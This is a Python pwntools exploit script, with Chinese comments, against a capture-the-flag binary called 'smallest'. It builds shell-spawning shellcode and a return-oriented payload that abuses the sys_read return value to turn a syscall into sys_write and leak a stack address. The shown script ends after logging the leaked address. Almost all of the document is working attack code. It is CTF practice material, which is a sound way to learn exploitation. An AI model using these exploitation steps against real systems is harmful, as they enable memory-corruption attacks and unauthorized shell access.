#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')


syscall_addr = 0x4000be
start_addr = 0x4000b0
set_rsi_rdi_addr = 0x4000b8
shellcode = asm(shellcraft.amd64.linux.sh())

io = process("./smallest")

payload = ""
payload += p64(start_addr)          #返回到start重新执行一遍sys_read，利用返回值设置rax = 1，调用sys_write
payload += p64(set_rsi_rdi_addr)    #mov rsi, rsp; mov rdi, rax; syscall; retn，此时相当于执行sys_write(1, rsp, size)
payload += p64(start_addr)          #泄露栈地址之后返回到start，执行下一步操作

io.send(payload)
sleep(3)
io.send(payload[8:8+1])             #利用sys_read读取一个字符，设置rax = 1
stack_addr = u64(io.recv()[8:16]) + 0x100   #从泄露的数据中抽取栈地址
log.info('stack addr = %#x' %(stack_addr))

